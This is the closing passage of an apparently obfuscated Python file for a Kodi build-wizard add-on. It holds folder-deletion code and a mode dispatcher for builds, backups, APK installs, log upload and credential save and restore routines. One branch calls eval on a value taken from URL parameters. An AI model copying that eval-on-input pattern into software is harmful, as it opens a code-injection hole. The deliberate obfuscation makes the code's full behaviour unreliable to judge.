				OO00000O0OOOO0O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00O0OOO0O0000O0O ,'false')#line:5623
				OOO0OOO0O0OO0OO0O =xbmc .executeJSONRPC (OO00000O0OOOO0O00 )#line:5624
				O00OO00OO0OOO0O00 =json .loads (OOO0OOO0O0OO0OO0O )#line:5625
				O0OOOO0OOO00O0O0O =os .path .join (user_folder ,O00O0OOO0O0000O0O )#line:5627
				if os .path .exists (O0OOOO0OOO00O0O0O ):#line:5629
					for O0000000O000O000O ,O0OO0OOOOO0OO0OO0 ,OOO000O0000OO0OOO in os .walk (O0OOOO0OOO00O0O0O ):#line:5630
						for O0O000O0O0OOO0000 in OOO000O0000OO0OOO :#line:5631
							os .unlink (os .path .join (O0000000O000O000O ,O0O000O0O0OOO0000 ))#line:5632
						for OO00OOOOO0000OO00 in O0OO0OOOOO0OO0OO0 :#line:5633
							shutil .rmtree (os .path .join (O0000000O000O000O ,OO00OOOOO0000OO00 ))#line:5634
					os .rmdir (O0OOOO0OOO00O0O0O )#line:5635
	except :pass #line:5637
params =get_params ()#line:5638
url =None #line:5639
name =None #line:5640
mode =None #line:5641
try :mode =urllib .unquote_plus (params ["mode"])#line:5643
except :pass #line:5644
try :name =urllib .unquote_plus (params ["name"])#line:5645
except :pass #line:5646
try :url =urllib .unquote_plus (params ["url"])#line:5647
except :pass #line:5648
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5650
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5651
def setView (OO0O0O0OO0OO0OOOO ,O0000000000OO00OO ):#line:5652
	if wiz .getS ('auto-view')=='true':#line:5653
		O0000O0000OOOO00O =wiz .getS (O0000000000OO00OO )#line:5654
		if O0000O0000OOOO00O =='50'and KODIV >=17 and SKIN =='skin.estuary':O0000O0000OOOO00O ='55'#line:5655
		if O0000O0000OOOO00O =='500'and KODIV >=17 and SKIN =='skin.estuary':O0000O0000OOOO00O ='50'#line:5656
		wiz .ebi ("Container.SetViewMode(%s)"%O0000O0000OOOO00O )#line:5657
if mode ==None :index ()#line:5659
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5661
elif mode =='builds':buildMenu ()#line:5662
elif mode =='viewbuild':viewBuild (name )#line:5663
elif mode =='buildinfo':buildInfo (name )#line:5664
elif mode =='buildpreview':buildVideo (name )#line:5665
elif mode =='install':buildWizard (name ,url )#line:5666
elif mode =='theme':buildWizard (name ,mode ,url )#line:5667
elif mode =='viewthirdparty':viewThirdList (name )#line:5668
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5669
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5670
elif mode =='maint':maintMenu (name )#line:5672
elif mode =='passpin':passandpin ()#line:5673
elif mode =='backmyupbuild':backmyupbuild ()#line:5674
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5675
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5676
elif mode =='advancedsetting':advancedWindow (name )#line:5677
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5678
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5679
elif mode =='asciicheck':wiz .asciiCheck ()#line:5680
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5681
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5682
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5683
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5684
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5685
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5686
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5687
elif mode =='currentsettings':viewAdvanced ()#line:5688
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5689
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5690
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5691
elif mode =='fixskin':backtokodi ()#line:5692
elif mode =='testcommand':testcommand ()#line:5693
elif mode =='logsend':logsend ()#line:5694
elif mode =='rdon':rdon ()#line:5695
elif mode =='rdoff':rdoff ()#line:5696
elif mode =='setrd':setrealdebrid ()#line:5697
elif mode =='setrd2':setautorealdebrid ()#line:5698
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5699
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5700
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5701
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5702
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5703
elif mode =='freshstart':freshStart ()#line:5704
elif mode =='forceupdate':wiz .forceUpdate ()#line:5705
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5706
elif mode =='forceclose':wiz .killxbmc ()#line:5707
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5708
elif mode =='hidepassword':wiz .hidePassword ()#line:5709
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5710
elif mode =='enableaddons':enableAddons ()#line:5711
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5712
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5713
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5714
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5715
elif mode =='uploadlog':uploadLog .Main ()#line:5716
elif mode =='viewlog':LogViewer ()#line:5717
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5718
elif mode =='viewerrorlog':errorChecking (all =True )#line:5719
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5720
elif mode =='purgedb':purgeDb ()#line:5721
elif mode =='fixaddonupdate':fixUpdate ()#line:5722
elif mode =='removeaddons':removeAddonMenu ()#line:5723
elif mode =='removeaddon':removeAddon (name )#line:5724
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5725
elif mode =='removedata':removeAddonData (name )#line:5726
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5727
elif mode =='systeminfo':systemInfo ()#line:5728
elif mode =='restorezip':restoreit ('build')#line:5729
elif mode =='restoregui':restoreit ('gui')#line:5730
elif mode =='restoreaddon':restoreit ('addondata')#line:5731
elif mode =='restoreextzip':restoreextit ('build')#line:5732
elif mode =='restoreextgui':restoreextit ('gui')#line:5733
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5734
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5735
elif mode =='traktsync':traktsync ()#line:5736
elif mode =='apk':apkMenu (name )#line:5738
elif mode =='apkscrape':apkScraper (name )#line:5739
elif mode =='apkinstall':apkInstaller (name ,url )#line:5740
elif mode =='speed':speedMenu ()#line:5741
elif mode =='net':net_tools ()#line:5742
elif mode =='GetList':GetList (url )#line:5743
elif mode =='youtube':youtubeMenu (name )#line:5744
elif mode =='viewVideo':playVideo (url )#line:5745
elif mode =='addons':addonMenu (name )#line:5747
elif mode =='addoninstall':addonInstaller (name ,url )#line:5748
elif mode =='savedata':saveMenu ()#line:5750
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5751
elif mode =='managedata':manageSaveData (name )#line:5752
elif mode =='whitelist':wiz .whiteList (name )#line:5753
elif mode =='trakt':traktMenu ()#line:5755
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5756
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5757
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5758
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5759
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5760
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5761
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5762
elif mode =='realdebrid':realMenu ()#line:5764
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5765
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5766
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5767
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5768
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5769
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5770
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5771
elif mode =='login':loginMenu ()#line:5773
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5774
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5775
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5776
elif mode =='clearlogin':loginit .clearSaved (name )#line:5777
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5778
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5779
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5780
elif mode =='contact':notify .contact (CONTACT )#line:5782
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5783
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5784
elif mode =='developer':developer ()#line:5786
elif mode =='converttext':wiz .convertText ()#line:5787
elif mode =='createqr':wiz .createQR ()#line:5788
elif mode =='testnotify':testnotify ()#line:5789
elif mode =='testnotify2':testnotify2 ()#line:5790
elif mode =='servicemanual':servicemanual ()#line:5791
elif mode =='fastinstall':fastinstall ()#line:5792
elif mode =='testupdate':testupdate ()#line:5793
elif mode =='testfirst':testfirst ()#line:5794
elif mode =='testfirstrun':testfirstRun ()#line:5795
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5796
elif mode =='bg':wiz .bg_install (name ,url )#line:5798
elif mode =='bgcustom':wiz .bg_custom ()#line:5799
elif mode =='bgremove':wiz .bg_remove ()#line:5800
elif mode =='bgdefault':wiz .bg_default ()#line:5801
elif mode =='rdset':rdsetup ()#line:5802
elif mode =='mor':morsetup ()#line:5803
elif mode =='mor2':morsetup2 ()#line:5804
elif mode =='resolveurl':resolveurlsetup ()#line:5805
elif mode =='urlresolver':urlresolversetup ()#line:5806
elif mode =='forcefastupdate':forcefastupdate ()#line:5807
elif mode =='traktset':traktsetup ()#line:5808
elif mode =='placentaset':placentasetup ()#line:5809
elif mode =='flixnetset':flixnetsetup ()#line:5810
elif mode =='reptiliaset':reptiliasetup ()#line:5811
elif mode =='yodasset':yodasetup ()#line:5812
elif mode =='numbersset':numberssetup ()#line:5813
elif mode =='uranusset':uranussetup ()#line:5814
elif mode =='genesisset':genesissetup ()#line:5815
elif mode =='fastupdate':fastupdate ()#line:5816
elif mode =='folderback':folderback ()#line:5817
elif mode =='menudata':Menu ()#line:5818
elif mode =='infoupdate':infobuild ()#line:5819
elif mode =='wait':wait ()#line:5820
elif mode ==2 :#line:5821
        wiz .torent_menu ()#line:5822
elif mode ==3 :#line:5823
        wiz .popcorn_menu ()#line:5824
elif mode ==8 :#line:5825
        wiz .metaliq_fix ()#line:5826
elif mode ==9 :#line:5827
        wiz .quasar_menu ()#line:5828
elif mode ==5 :#line:5829
        swapSkins ('skin.Premium.mod')#line:5830
elif mode ==13 :#line:5831
        wiz .elementum_menu ()#line:5832
elif mode ==16 :#line:5833
        wiz .fix_wizard ()#line:5834
elif mode ==17 :#line:5835
        wiz .last_play ()#line:5836
elif mode ==18 :#line:5837
        wiz .normal_metalliq ()#line:5838
elif mode ==19 :#line:5839
        wiz .fast_metalliq ()#line:5840
elif mode ==20 :#line:5841
        wiz .fix_buffer2 ()#line:5842
elif mode ==21 :#line:5843
        wiz .fix_buffer3 ()#line:5844
elif mode ==11 :#line:5845
        wiz .fix_buffer ()#line:5846
elif mode ==15 :#line:5847
        wiz .fix_font ()#line:5848
elif mode ==14 :#line:5849
        wiz .clean_pass ()#line:5850
elif mode ==22 :#line:5851
        wiz .movie_update ()#line:5852
elif mode =='adv_settings':buffer1 ()#line:5853
elif mode =='getpass':getpass ()#line:5854
elif mode =='setpass':setpass ()#line:5855
elif mode =='setuname':setuname ()#line:5856
elif mode =='passandUsername':passandUsername ()#line:5857
elif mode =='9':disply_hwr ()#line:5858
elif mode =='99':disply_hwr2 ()#line:5859
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))